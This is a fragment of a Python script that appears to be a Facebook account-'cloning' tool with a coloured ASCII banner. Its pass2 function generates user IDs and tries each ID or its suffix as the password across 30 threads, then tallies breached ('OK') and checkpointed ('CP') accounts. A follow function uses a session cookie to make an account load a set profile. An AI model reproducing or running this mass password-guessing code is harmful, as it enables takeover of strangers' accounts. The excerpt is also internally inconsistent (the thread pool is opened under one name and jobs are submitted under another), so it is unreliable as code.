...
logo ="""  \033[1;92m__       ___  ___  _______
  \033[1;97m          /""\     |"  \/"  ||   _  "\  
  \033[1;92m        /    \     \   \  / (. |_)  :) 
  \033[1;97m      /' /\  \     \\  \/  |:     \/  
  \033[1;92m    //  __'  \    /\.  \  (|  _  \\  
  \033[1;97m  /   /  \\  \  /  \   \ |: |_)  :) 
  \033[1;92m(___/    \___)|___/\___|(_______/  
\033[1;97m====================================================
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://free.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
...
def pass2():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,uid]
            Rawalpindi.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
